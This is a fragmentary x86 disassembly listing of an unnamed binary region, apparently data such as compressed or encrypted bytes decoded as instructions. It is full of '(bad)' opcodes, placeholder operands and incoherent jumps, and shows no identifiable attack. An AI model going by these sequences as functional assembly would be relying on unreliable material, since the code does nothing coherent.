  42b588:	xchg   ecx,eax
  42b589:	jmp    0x42b5da
  42b58b:	xor    ebx,DWORD PTR [ebx]
  42b58d:	aaa    
  42b58e:	outs   dx,BYTE PTR ds:[esi]
  42b58f:	push   esi
	...
  42b5f4:	loopne 0x42b58a
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	cli    
  42b601:	fild   DWORD PTR [ecx+0x1cfc46b]
  42b607:	add    BYTE PTR [ecx+eax*1],al
  42b60a:	add    BYTE PTR [eax],al
  42b60c:	pop    ebx
  42b60d:	fild   DWORD PTR [edi+0x5e]
  42b610:	les    eax,FWORD PTR [esi]
  42b612:	ret    0x1a85
  42b615:	popa   
  42b616:	and    edi,DWORD PTR ds:0x27cb1ea5
  42b61c:	cwde   
  42b61d:	inc    ebx
  42b61e:	sbb    al,0x43
  42b620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b621:	mov    eax,ds:0x16999ec3
  42b626:	sub    eax,0xe5b48132
  42b62b:	cmp    eax,DWORD PTR [esi]
  42b62d:	rep stos BYTE PTR es:[edi],al
  42b62f:	je     0x42b5b7
  42b631:	bound  ecx,QWORD PTR ds:0x6bff4f7b
  42b637:	mov    DWORD PTR [ebp+0x79],eax
  42b63a:	daa    
  42b63b:	aaa    
  42b63c:	jg     0x42b61c
  42b63e:	xchg   esp,eax
  42b63f:	jae    0x42b5fb
  42b641:	mov    dh,0x6d
  42b643:	fcomp  QWORD PTR [eax-0x20]
  42b646:	adc    DWORD PTR [edi],esi
  42b648:	fdivr  QWORD PTR [esi]
  42b64a:	in     eax,dx
  42b64b:	cld    
  42b64c:	xchg   BYTE PTR [edi],bh
  42b64e:	or     edx,DWORD PTR [ebp+0x55f1cde3]
  42b654:	xchg   ax,ax
  42b656:	pop    edi
  42b657:	call   FWORD PTR [ecx]
  42b659:	icebp  
  42b65a:	data16 into 
  42b65c:	jg     0x42b612
  42b65e:	cld    
  42b65f:	cld    
  42b660:	pop    ds
  42b661:	or     al,0x60
  42b663:	mov    eax,ds:0x8cf9a988
  42b668:	mov    dl,0x76
  42b66a:	in     eax,dx
  42b66b:	sar    BYTE PTR [ebx-0x1a75bc6],1
  42b671:	mov    ebp,0x5e6a35d7
  42b676:	or     eax,0x23d9a14f
  42b67b:	shr    esp,0x6a
  42b67e:	sub    ebx,edi
  42b680:	dec    edx
  42b681:	jge    0x42b6ac
  42b683:	arpl   WORD PTR [esi-0x24],sp
  42b686:	je     0x42b6ee
  42b688:	dec    esp
  42b689:	sbb    eax,0xf2ea5d85
  42b68e:	inc    ebx
  42b68f:	lods   eax,DWORD PTR ds:[esi]
  42b690:	sub    ecx,DWORD PTR [edx]
  42b692:	fstp   TBYTE PTR [ebx+0x26]
  42b695:	cmp    edi,DWORD PTR [ebp+0x5e4f9601]
  42b69b:	nop
  42b69c:	jmp    0x42b6c0
  42b69e:	mov    ecx,0xde398d81
  42b6a3:	enter  0xb75,0x98
  42b6a7:	xor    ecx,DWORD PTR [edx-0x59]
  42b6aa:	sar    BYTE PTR [ecx],0x12
  42b6ad:	mov    ?,ebp
  42b6af:	xor    DWORD PTR gs:[esi],0xffffffda
  42b6b3:	ins    BYTE PTR es:[edi],dx
  42b6b4:	(bad)  
  42b6b5:	and    dl,dl
  42b6b7:	fnstenv [edi-0x6e]
  42b6ba:	ret    
  42b6bb:	loopne 0x42b6d9
  42b6bd:	leave  
  42b6be:	cmp    eax,DWORD PTR [ebx-0x79]
  42b6c1:	mov    bh,0xc6
  42b6c3:	mov    edx,0x644347b3
  42b6c8:	gs inc ebx
  42b6ca:	push   0x57
  42b6cc:	les    edx,FWORD PTR [edx-0x21]
  42b6cf:	shr    edx,0xdf
  42b6d2:	loop   0x42b6a6
  42b6d4:	(bad)
  42b6d7:	xchg   esp,eax
  42b6d8:	xlat   BYTE PTR ds:[ebx]
  42b6d9:	scas   eax,DWORD PTR es:[edi]
  42b6da:	push   esi
  42b6db:	xchg   ebp,eax
  42b6dc:	ja     0x42b6cc
  42b6de:	mov    ecx,?
  42b6e0:	dec    DWORD PTR [ebp+0x47]
  42b6e3:	fs ret 
  42b6e5:	iret   
  42b6e6:	icebp  
  42b6e7:	xchg   esp,eax
  42b6e8:	into   
  42b6e9:	add    ch,BYTE PTR [ebx+0x6]
  42b6ec:	rep ins BYTE PTR es:[edi],dx
  42b6ee:	adc    ecx,DWORD PTR [ecx]
  42b6f0:	pop    ebp
  42b6f1:	pop    edx
  42b6f2:	popf   
  42b6f3:	xor    dl,cl
  42b6f5:	jne    0x42b6cf
  42b6f7:	jecxz  0x42b689
  42b6f9:	mov    ds:0x659dcd7c,eax
  42b6fe:	cmp    BYTE PTR [esi+0x65],cl
  42b701:	adc    DWORD PTR [eax-0x31],ecx
  42b704:	jns    0x42b6f5
  42b706:	scas   al,BYTE PTR es:[edi]
  42b707:	cmp    dl,ah
  42b709:	pop    edx
  42b70a:	push   ebx
  42b70b:	sub    eax,0x8231d3b5
	...
  42b774:	dec    esi
  42b775:	inc    edx
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	mov    esp,0xc88cb415
  42b785:	rol    BYTE PTR [ecx],1
  42b787:	add    BYTE PTR [ecx+eax*1],al
  42b78a:	add    BYTE PTR [eax],al
  42b78c:	jecxz  0x42b76c
  42b78e:	and    al,0xca
  42b790:	shl    DWORD PTR [eax],cl
  42b792:	popf   
  42b793:	fldenv [esi-0x53abbb3b]
  42b799:	jne    0x42b7cb
  42b79b:	sbb    BYTE PTR [ecx+eax*8-0x78],dl
  42b79f:	dec    ecx
  42b7a0:	fistp  QWORD PTR [ebp-0x2a]
  42b7a3:	jns    0x42b7d3
  42b7a5:	add    edx,DWORD PTR ds:0x49e7de84
  42b7ab:	or     al,0x24
  42b7ad:	clc    
  42b7ae:	adc    esp,eax
  42b7b0:	out    dx,eax
  42b7b1:	test   DWORD PTR [eax-0x72],ecx
  42b7b4:	cmp    dl,BYTE PTR [ebp+0x76c4f558]
  42b7ba:	test   al,0xf
  42b7bc:	(bad)  
  42b7bd:	jmp    0x42b804
  42b7bf:	or     eax,0xc90e13b7
  42b7c4:	add    al,BYTE PTR [ebx-0x18278f3]
  42b7ca:	jno    0x42b80b
  42b7cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b7cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b7ce:	lods   eax,DWORD PTR ds:[esi]
  42b7cf:	pop    ecx
  42b7d0:	jmp    0x42b814
  42b7d2:	cmp    ah,BYTE PTR [ebx-0x7063c6f0]
  42b7d8:	rsm    
  42b7da:	xchg   ebx,eax
  42b7db:	jl     0x42b81d
  42b7dd:	fcmovb st,st(1)
  42b7df:	pusha  
  42b7e0:	jae    0x42b7b8
  42b7e2:	stos   BYTE PTR es:[edi],al
  42b7e3:	shl    DWORD PTR [eax+0x59dd9369],cl
  42b7e9:	nop
  42b7ea:	add    DWORD PTR [ebp+0x4b71e6a0],edx
  42b7f0:	repz sub eax,0x40be85d6
  42b7f6:	jb     0x42b7f5
  42b7f8:	sbb    edi,eax
  42b7fa:	cmp    ebx,DWORD PTR [eax+0x29019854]
  42b800:	lock daa 
  42b802:	xchg   ebp,eax
  42b803:	mov    ebx,0x4d64272e
  42b808:	mov    ds:0x6f95956e,eax
  42b80d:	inc    eax
  42b80e:	mov    ebx,0x8f9427a6
  42b813:	cmp    edx,DWORD PTR ds:0x411ad231
  42b819:	mov    DWORD PTR ds:[esi],ecx
  42b81c:	xor    ebp,ebx
  42b81e:	mov    esi,DWORD PTR [ebp+0x44]
  42b821:	popf   
  42b822:	jne    0x42b7ef
  42b824:	scas   eax,DWORD PTR es:[edi]
  42b825:	xchg   edx,eax
  42b826:	repz rcl DWORD PTR [edi-0x4b0c15ac],1
  42b82d:	mov    cs,edx
  42b82f:	je     0x42b8ab
  42b831:	in     eax,0x1a
  42b833:	pop    edi
  42b834:	out    dx,al
  42b835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b836:	sub    BYTE PTR [esi+0x644885c],0xe9
  42b83d:	mov    esp,0xd638a3c6
  42b842:	rcl    DWORD PTR [esi],cl
  42b844:	dec    ebx
  42b845:	repz out 0xd7,ax
  42b849:	inc    ebx
  42b84a:	jp     0x42b7d8
  42b84c:	enter  0xa7f0,0x14
  42b850:	mov    BYTE PTR [esi+0x7b],0xf3
  42b854:	mov    al,ds:0xa314db55
  42b859:	in     al,dx
  42b85a:	test   al,0xcb
  42b85c:	enter  0xb87d,0x6
  42b860:	push   esp
  42b861:	xor    ah,BYTE PTR [ebx]
  42b863:	imul   ebp,DWORD PTR [ebx+0x3ba86451],0xffffffff
  42b86a:	push   esi
  42b86b:	and    edi,edx
  42b86d:	cmp    bl,ch
  42b86f:	iret   
  42b870:	mov    bh,0x6c
  42b872:	in     al,0xfe
  42b874:	sub    eax,0x65453b15
  42b879:	pushf  
  42b87a:	fucomip st,st(0)
  42b87c:	scas   al,BYTE PTR es:[edi]
  42b87d:	cmp    ecx,ecx
  42b87f:	enter  0xd22a,0xf2
  42b883:	sbb    esi,eax
  42b885:	stos   BYTE PTR es:[edi],al
  42b886:	div    DWORD PTR [eax+0x5ae70679]
  42b88c:	dec    ebx
  42b88d:	sub    DWORD PTR [ebx],edx
  42b88f:	mov    esi,0x0
	...
  42b8f4:	call   0x2a7796
  42b8f9:	out    0xf9,eax
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     ecx,DWORD PTR [ebp-0x4f]
  42b902:	add    esi,DWORD PTR [eax+0x1d1cc]
  42b908:	add    al,0x1
  42b90a:	add    BYTE PTR [eax],al
  42b90c:	loope  0x42b922
  42b90e:	push   ss
  42b90f:	mov    ch,0x12
  42b911:	lods   eax,DWORD PTR ds:[esi]
  42b912:	loopne 0x42b8a2
  42b914:	cli    
  42b915:	cmp    DWORD PTR [ecx-0x9],eax
  42b918:	add    al,BYTE PTR [eax+eiz*1-0x34]
  42b91c:	cld    
  42b91d:	mov    cl,0x99
  42b91f:	pop    ds
  42b920:	retf   
  42b921:	push   ebp
  42b922:	cmp    ebp,ecx
  42b924:	mul    DWORD PTR cs:[edx+0x62]
  42b928:	jg     0x42b8ca
  42b92a:	or     DWORD PTR [edx+0x34],ebx
  42b92d:	cmc    
  42b92e:	sbb    al,0xa9
  42b930:	fadd   DWORD PTR [ebx-0x49]
  42b933:	mov    ebx,0x53713bf0
  42b938:	push   ss
  42b939:	nop
  42b93a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b93b:	or     al,0x8b
  42b93d:	mov    bh,0xbc
  42b93f:	jp     0x42b973
  42b941:	or     DWORD PTR [ecx+0x66],esp
  42b944:	sar    BYTE PTR [eax+eiz*8+0x3b],0x5f
  42b949:	into   
  42b94a:	sub    bl,BYTE PTR [edx+esi*1]
  42b94d:	sbb    edi,DWORD PTR [esp+ebx*8+0x5605cf7d]
  42b954:	(bad)  
  42b955:	fldenv [ebx+0x4f4947b8]
  42b95b:	mov    ebx,0x61dffabf
  42b960:	xor    DWORD PTR [ebp+0x31],0xffffffc8
  42b964:	cmp    BYTE PTR [ecx],ah
  42b966:	dec    edi
  42b967:	mov    dl,0x19
  42b969:	xor    al,dl
  42b96b:	ins    BYTE PTR es:[edi],dx
  42b96c:	fcom   QWORD PTR [esi+0x7e]
  42b96f:	aaa    
  42b970:	cwde   
  42b971:	inc    eax
  42b972:	xchg   ebp,eax
  42b973:	sub    al,0xc2
  42b975:	dec    edx
  42b976:	push   cs
  42b977:	add    BYTE PTR [edi-0x73],ah
  42b97a:	adc    ecx,0x43876686
  42b980:	sbb    ebx,DWORD PTR [ecx]
  42b982:	es int3 
  42b984:	paddw  mm5,QWORD PTR [eax-0x7dd81bcd]
  42b98b:	es scas al,BYTE PTR es:[edi]
  42b98d:	dec    edi
  42b98e:	push   ds
  42b98f:	xchg   BYTE PTR [edx],cl
  42b991:	repnz adc al,0x13
  42b994:	mov    edx,0xd5a906ed
  42b999:	scas   eax,DWORD PTR es:[edi]
  42b99a:	dec    esp
  42b99b:	loop   0x42b9f4
  42b99d:	jge    0x42b977
  42b99f:	in     al,dx
  42b9a0:	xchg   esp,eax
  42b9a1:	mov    ch,0x9e
  42b9a3:	sbb    BYTE PTR [esi+0x44],dh
  42b9a6:	fcomi  st,st(0)
  42b9a8:	daa    
  42b9a9:	or     edi,DWORD PTR [ecx]
  42b9ab:	dec    ecx
  42b9ac:	xlat   BYTE PTR ds:[ebx]
  42b9ad:	and    al,0xad
  42b9af:	pop    ebp
  42b9b0:	les    esi,FWORD PTR [eax+esi*2]
  42b9b3:	jne    0x42b98c
  42b9b5:	push   esi
  42b9b6:	or     esi,esp
  42b9b8:	leave  
  42b9b9:	pop    edi
  42b9ba:	mov    ah,ch
  42b9bc:	inc    edi
  42b9bd:	dec    esi
  42b9be:	test   al,0x31
  42b9c0:	push   ebx
  42b9c1:	pop    eax
  42b9c2:	in     eax,0xd
  42b9c4:	xor    BYTE PTR [eax],cl
  42b9c6:	popa   
  42b9c7:	or     al,0x42
  42b9c9:	xchg   ch,dl
  42b9cb:	or     BYTE PTR [edx],bh
  42b9cd:	mov    ecx,0x581865ae
  42b9d2:	fadd   st(0),st
  42b9d4:	xor    al,0x1d
  42b9d6:	jp     0x42b9bf
  42b9d8:	in     eax,0xef
  42b9da:	cmp    esp,DWORD PTR [ebp-0x44c2936a]
  42b9e0:	lea    ebx,[eax-0x8]
  42b9e3:	cwde   
  42b9e4:	ret    0xb336
  42b9e7:	lds    edi,FWORD PTR [edi]
  42b9e9:	popa   
  42b9ea:	icebp  
  42b9eb:	call   0x2863a1a2
  42b9f0:	ja     0x42ba3f
  42b9f2:	dec    esi
  42b9f3:	ins    BYTE PTR es:[edi],dx
  42b9f4:	pop    ecx
  42b9f5:	mov    cl,0x94
  42b9f7:	retf   0x3459
  42b9fa:	in     eax,dx
  42b9fb:	cdq    
  42b9fc:	outs   dx,BYTE PTR ds:[esi]
  42b9fd:	push   edi
  42b9fe:	ins    DWORD PTR es:[edi],dx
  42b9ff:	push   ecx
  42ba00:	fdivr  DWORD PTR [edi]
  42ba02:	dec    esi
  42ba03:	shr    BYTE PTR [ecx-0x76],0x80
  42ba07:	aaa    
  42ba08:	enter  0x2e10,0xc
  42ba0c:	sub    al,0xce
  42ba0e:	hlt    
  42ba0f:	xor    DWORD PTR [eax],eax
	...
  42ba71:	add    BYTE PTR [eax],al
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     esp,eax
  42ba81:	aam    0xc5
  42ba83:	ja     0x42ba55
  42ba85:	rol    BYTE PTR [ecx],cl
  42ba87:	add    BYTE PTR [ecx+eax*1],al
  42ba8a:	add    BYTE PTR [eax],al
  42ba8c:	mov    BYTE PTR [edi],0x99
  42ba8f:	repnz mov esi,0x3857173
  42ba95:	pop    edi
  42ba96:	or     al,0xa7
  42ba98:	mov    esi,0xc5b72c55
  42ba9d:	test   DWORD PTR [edx],0x654ad47f
  42baa3:	out    0xa5,al
  42baa5:	mov    esi,0x2aea9228
  42baaa:	xchg   ecx,eax
  42baab:	dec    ebp
  42baac:	push   esi
  42baad:	das    
  42baae:	mov    DWORD PTR [eax+0x4a],0x63e3ae5c
  42bab5:	mov    esp,0x4d4507fa
  42baba:	push   0xfd4454e5
  42babf:	adc    DWORD PTR [eax+0x7e],eax
  42bac2:	jno    0x42bb2e
  42bac4:	mov    WORD PTR [edi],?
  42bac6:	cmp    esi,DWORD PTR [ebx+eax*2+0x55362fa]
  42bacd:	leave  
  42bace:	daa    
  42bacf:	and    al,0xa2
  42bad1:	sahf   
  42bad2:	mov    ebp,0x4b650e95
  42bad7:	test   DWORD PTR [edx],ebp
  42bad9:	sti    
  42bada:	and    al,0xbb
  42badc:	add    al,0xff
  42bade:	cmp    al,0x5
  42bae0:	push   0xffffffb5
  42bae2:	fs sar BYTE PTR cs:[edi-0x641c1e44],cl
  42baea:	xchg   ebp,eax
  42baeb:	push   ebp
  42baec:	adc    dl,0xa3
  42baef:	inc    esp
  42baf0:	mov    edi,0x95de1285
  42baf5:	mov    esp,0xb654b23
  42bafa:	and    DWORD PTR ds:0xeea40bd3,ebp
  42bb00:	push   edi
  42bb01:	out    dx,al
  42bb02:	and    ebp,esp
  42bb04:	ins    DWORD PTR es:[edi],dx
  42bb05:	ins    BYTE PTR es:[edi],dx
  42bb06:	pop    ebx
  42bb07:	int3   
  42bb08:	jb     0x42bac5
  42bb0a:	and    eax,0xf6eb3c81
  42bb0f:	out    dx,al
  42bb10:	ret    
  42bb11:	jb     0x42bad0
  42bb13:	pop    ecx
  42bb14:	xchg   ebp,eax
  42bb15:	shr    BYTE PTR [ecx],1
  42bb17:	mov    ebp,0xa029684f
  42bb1c:	xchg   DWORD PTR [eax+0x6338d4b9],edx
  42bb22:	add    BYTE PTR [ecx+0x51ff3c05],0x12
  42bb29:	dec    esi
  42bb2a:	sub    DWORD PTR [ebx+0x605b40c5],0x3623e970
  42bb34:	ja     0x42bb1e
  42bb36:	jae    0x42bb5f
  42bb38:	scas   al,BYTE PTR es:[edi]
  42bb39:	outs   dx,BYTE PTR ds:[esi]
  42bb3a:	shr    DWORD PTR [edi-0x12],cl
  42bb3d:	mov    al,ds:0x6fd5b093
  42bb42:	jmp    0x80cf:0xbf5af67e
  42bb49:	retf   0xba0b
  42bb4c:	ret    
  42bb4d:	and    al,0xab
  42bb4f:	out    dx,al
  42bb50:	mov    dl,0xd1
  42bb52:	in     al,0xb7
  42bb54:	sub    esi,DWORD PTR fs:[esi-0x1234bbf0]
  42bb5b:	aad    0x1c
  42bb5d:	mov    al,0xbb
  42bb5f:	xor    eax,DWORD PTR [eax+edx*1-0x60]
  42bb63:	sbb    al,0xa1
  42bb65:	pushf  
  42bb66:	ret    
  42bb67:	push   es
  42bb68:	lahf   
  42bb69:	sti    
  42bb6a:	pop    ebx
  42bb6b:	push   0xcc39074e
  42bb70:	icebp  
  42bb71:	retf   0xc0e1
  42bb74:	xlat   BYTE PTR ds:[ebx]
  42bb75:	pop    esi
  42bb76:	mov    eax,ebp
  42bb78:	xchg   ecx,eax
  42bb79:	push   0x8563d57a
  42bb7e:	mov    BYTE PTR [esi],bh
  42bb80:	and    eax,0x66126f64
  42bb85:	sti    
  42bb86:	jns    0x42bbb1
  42bb88:	fstp   DWORD PTR [ecx-0x789cdbc4]
  42bb8e:	lock mov ebp,0x0
	...
  42bbf4:	xor    al,0x28
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	cmovl  edx,DWORD PTR [eax-0x21]
  42bc04:	aam    0xd3
  42bc06:	add    DWORD PTR [eax],eax
  42bc08:	add    al,0x1
  42bc0a:	add    BYTE PTR [eax],al
  42bc0c:	xor    eax,0x876f57bd
  42bc11:	sbb    DWORD PTR ds:0xef0525db,0xffffffaa
  42bc18:	(bad)  
  42bc19:	jecxz  0x42bc8d
  42bc1b:	mov    ecx,0x74ba76a0
  42bc20:	mov    edi,0x1bf17720
  42bc25:	mul    DWORD PTR [edi]
  42bc27:	pop    esp
  42bc28:	push   cs
  42bc29:	jnp    0x42bbce
  42bc2b:	inc    esp
  42bc2c:	js     0x42bbe1
  42bc2e:	inc    esi
  42bc2f:	or     dh,dl
  42bc31:	int3   
  42bc32:	je     0x42bc8f
  42bc34:	adc    al,cl
  42bc36:	shl    DWORD PTR [ebx],0xb
  42bc39:	push   edi
  42bc3a:	pushf  
  42bc3b:	cwde   
  42bc3c:	jle    0x42bcac
  42bc3e:	dec    ebp
  42bc3f:	stos   DWORD PTR es:[edi],eax
  42bc40:	fcom   DWORD PTR [ebp-0x1ddece5f]
  42bc46:	std    
  42bc47:	fcmovne st,st(2)
  42bc49:	in     eax,dx
  42bc4a:	loope  0x42bcbc
  42bc4c:	pop    edx
  42bc4d:	dec    ecx
  42bc4e:	ret    0x9cd0
  42bc51:	je     0x42bc32
  42bc53:	enter  0x6f47,0xeb
  42bc57:	fbld   TBYTE PTR [eax]
  42bc59:	pop    ds
  42bc5a:	and    esi,esp
  42bc5c:	mov    ah,ch
  42bc5e:	cwde   
  42bc5f:	adc    al,bl
  42bc61:	push   ebp
  42bc62:	sub    al,0x14
  42bc64:	add    eax,0x3fdc6cda
  42bc69:	sbb    BYTE PTR [eax+0x3893fe2e],0xa3
  42bc70:	jge    0x42bc33
  42bc72:	sbb    eax,0x75fca634
  42bc77:	outs   dx,BYTE PTR ds:[esi]
  42bc78:	cmp    eax,0xfffffffa
  42bc7b:	fidivr WORD PTR [eax+0x6329ac1b]
  42bc81:	data16 sub al,0x1
  42bc84:	vmwrite edi,DWORD PTR [esi]
  42bc87:	adc    ah,ch
  42bc89:	sbb    BYTE PTR ds:0x8915c222,ch
  42bc8f:	lahf   
  42bc90:	(bad)  
  42bc91:	loop   0x42bc19
  42bc93:	lods   eax,DWORD PTR ds:[esi]
  42bc94:	cmp    BYTE PTR ds:0xa952244,ch
  42bc9a:	loope  0x42bc86
  42bc9c:	sahf   
  42bc9d:	adc    DWORD PTR es:[esp+eax*8-0x64],ebx
  42bca2:	mov    esp,0xa320301b
  42bca7:	push   ecx
  42bca8:	mov    al,0x8
  42bcaa:	mov    dl,0x1a
  42bcac:	test   DWORD PTR [ebp-0x4b4979da],eax
  42bcb2:	sar    BYTE PTR [ecx+0x1b1c49b9],0x54
  42bcb9:	sbb    eax,0x87b86b06
  42bcbe:	ret    0xceb5
  42bcc1:	in     al,0x35
  42bcc3:	add    BYTE PTR [ecx-0x1988f358],bh
  42bcc9:	inc    esp
  42bcca:	popf   
  42bccb:	adc    edx,DWORD PTR [ebp+0x77dc277d]
  42bcd1:	mov    dl,0x5c
  42bcd3:	xchg   ecx,eax
  42bcd4:	test   esi,esi
  42bcd6:	push   ebx
  42bcd7:	nop
  42bcd8:	inc    edx
  42bcd9:	leave  
  42bcda:	js     0x42bcf6
  42bcdc:	xchg   DWORD PTR [eax-0x41],edi
  42bcdf:	addr16 and al,0x6a
  42bce2:	jmp    0xa8a13795
  42bce7:	sbb    dh,dh
  42bce9:	aam    0x1b
  42bceb:	pusha  
  42bcec:	shr    DWORD PTR [edi+0x15],0xad
  42bcf0:	lods   eax,DWORD PTR ds:[esi]
  42bcf1:	rcr    ecx,1
  42bcf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bcf4:	leave  
  42bcf5:	mov    eax,ds:0xcbdad6b1
  42bcfa:	imul   edx,esi,0x15
  42bcfd:	xchg   BYTE PTR [ebx+0x526f906e],bl
  42bd03:	or     DWORD PTR [ebx],eax
  42bd05:	clc    
  42bd06:	je     0x42bd1b
  42bd08:	fst    DWORD PTR [ebp+0x7e032b61]
  42bd0e:	and    cl,al
	...
  42bd74:	mov    al,0xb6
  42bd76:	pushf  
  42bd77:	adc    al,0x9e
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd5b
  42bd81:	push   eax
  42bd82:	and    DWORD PTR [ebp-0x28],edi
  42bd85:	aam    0x1
  42bd87:	add    BYTE PTR [ecx+eax*1],al
  42bd8a:	add    BYTE PTR [eax],al
  42bd8c:	ret    
  42bd8d:	xchg   ebx,eax
  42bd8e:	adc    BYTE PTR [edi+0x4],ch
  42bd91:	cmp    cl,BYTE PTR ds:0x8ae106cd
  42bd97:	dec    ebx
  42bd98:	cmp    eax,0xf3dd7e4e
  42bd9d:	call   0xbcdc:0x82ddc2e1
  42bda4:	jecxz  0x42bda8
  42bda6:	bound  ecx,QWORD PTR [edi]
  42bda8:	fistp  WORD PTR [esi]
  42bdaa:	int3   
  42bdab:	sub    eax,0x59851a04
  42bdb0:	jmp    0x42bd89
  42bdb2:	jnp    0x42bd81
  42bdb4:	aas    
  42bdb5:	mov    dh,0xfb
  42bdb7:	call   0x43cdfe9a
  42bdbc:	mov    ah,0x74
  42bdbe:	and    ch,ch
  42bdc0:	push   ebp
  42bdc1:	push   edx
  42bdc2:	addr16 (bad) 
  42bdc4:	jae    0x42bdbd
  42bdc6:	xlat   BYTE PTR ds:[ebx]
  42bdc7:	mov    DWORD PTR [ebp-0x378d8e28],esi
  42bdcd:	jmp    0xea3a:0x39ff3b54
  42bdd4:	pusha  
  42bdd5:	adc    BYTE PTR [eax-0x1f2a4ae7],dl
  42bddb:	or     al,0x58
  42bddd:	cmp    dh,BYTE PTR [ecx-0x5792c1e9]
  42bde3:	iret   
  42bde4:	cmp    eax,0xfe4a7534
  42bde9:	sub    cl,BYTE PTR [ecx+0x39]
  42bdec:	mov    dh,0xd7
  42bdee:	mov    bh,0xc1
  42bdf0:	xchg   BYTE PTR [eax+0x45fafcea],bl
  42bdf6:	mov    ss,WORD PTR [eax]
  42bdf8:	pop    ecx
  42bdf9:	add    DWORD PTR ds:0x5f2dec8f,esi
  42bdff:	test   DWORD PTR [eax-0x3f],edi
  42be02:	std    
  42be03:	ds jmp 0x7f32d822
  42be09:	imul   ecx
  42be0b:	enter  0xf42d,0x9f
  42be0f:	mov    bl,0x48
  42be11:	call   0x2946bd8a
  42be16:	stc    
  42be17:	push   0x1f
  42be19:	ret    
  42be1a:	xchg   esp,eax
  42be1b:	add    al,0xe7
  42be1d:	mov    dh,BYTE PTR [ebx+0x3b]
  42be20:	add    cl,BYTE PTR [ecx-0x7e]
  42be23:	shl    DWORD PTR [ecx-0x6c16a03f],cl
  42be29:	gs in  eax,0x39
  42be2c:	cmp    BYTE PTR [eax],bl
  42be2e:	mov    WORD PTR [esp+ebp*8-0x20],es
  42be32:	sub    ecx,DWORD PTR [edx-0x70]
  42be35:	and    DWORD PTR [edx-0x276f76a4],ebp
  42be3b:	cmp    ch,ah
  42be3d:	mov    al,0xc5
  42be3f:	in     al,0x4b
  42be41:	xchg   ebp,eax
  42be42:	das    
  42be43:	loopne 0x42be93
  42be45:	jne    0x42be23
  42be47:	adc    eax,0xfff440a2
  42be4c:	and    esi,edi
  42be4e:	test   al,0xf7
  42be50:	sbb    dl,BYTE PTR [edx-0x6416c3ee]
  42be56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be57:	or     al,BYTE PTR [eax+0x39813154]
  42be5d:	dec    eax
  42be5e:	or     eax,0x2313c2d0
  42be63:	push   esi
  42be64:	sub    esi,esp
  42be66:	mov    DWORD PTR [edi-0x5f167cd6],0xba0e9df5
  42be70:	jb     0x42be7e
  42be72:	sbb    al,0x3f
  42be74:	fild   DWORD PTR [ebx-0x25d4664e]
  42be7a:	inc    eax
  42be7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be7c:	xchg   esp,eax
  42be7d:	ret    0x9869
  42be80:	or     BYTE PTR [edi-0x4168c361],0xf
  42be87:	push   0x6c7fe3f7
  42be8c:	popf   
  42be8d:	outs   dx,BYTE PTR ds:[esi]
  42be8e:	mov    ds:0xaf,al
	...
  42bef3:	add    BYTE PTR [edi-0x825b8e0],dl
  42bef9:	call   FWORD PTR [edi-0x28375c93]
  42beff:	jnp    0x42beee
  42bf01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf02:	xchg   ecx,eax
  42bf03:	push   edx
  42bf04:	(bad)  
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    al,0x1
  42bf0a:	add    BYTE PTR [eax],al
  42bf0c:	dec    edi
  42bf0d:	jp     0x42bee0
  42bf0f:	pop    eax
  42bf10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf11:	sbb    al,0xf0
  42bf13:	in     al,0x3d
  42bf15:	pop    esp
  42bf16:	retf   0x2cd5
  42bf19:	sbb    BYTE PTR [ebx],dl
  42bf1b:	ficom  WORD PTR [esi]
  42bf1d:	pop    ecx
  42bf1e:	fs and esi,ecx
  42bf21:	nop
  42bf22:	fs dec eax
  42bf24:	mov    ch,0x9a
  42bf26:	out    0x7d,eax
  42bf28:	enter  0x76fc,0x46
  42bf2c:	sbb    BYTE PTR [ecx+0x4430d525],bh
  42bf32:	adc    al,0x72
  42bf34:	dec    eax
  42bf35:	mov    al,ds:0x35eb3f99
  42bf3a:	mov    DWORD PTR [edi],ebx
  42bf3c:	inc    esp
  42bf3d:	pop    ecx
  42bf3e:	jg     0x42bf4c
  42bf40:	xchg   ecx,eax
  42bf41:	push   ecx
  42bf42:	pop    edx
  42bf43:	sub    al,0x62
  42bf45:	and    ecx,eax
  42bf47:	int3   
  42bf48:	xor    dh,ah
  42bf4a:	sbb    esp,DWORD PTR [edi-0x7fd9c794]
  42bf50:	cmp    BYTE PTR [edx],ah
  42bf52:	loop   0x42bf5b
  42bf54:	mov    DWORD PTR [ebp+0x5cf8b373],ebp
  42bf5a:	pop    esi
  42bf5b:	sahf   
  42bf5c:	shl    BYTE PTR [ebx],cl
  42bf5e:	pop    ecx
  42bf5f:	mov    DWORD PTR [esi],eax
  42bf61:	iret   
  42bf62:	and    BYTE PTR [esi-0x70a13f3b],bl
  42bf68:	or     DWORD PTR [edx-0x6ff560c5],0xffffffc0
  42bf6f:	dec    esi
  42bf70:	and    dl,bl
  42bf72:	dec    edx
  42bf73:	xchg   esi,eax
  42bf74:	iret   
  42bf75:	bound  ebx,QWORD PTR [esi+edx*2+0x2e70d999]
  42bf7c:	iret   
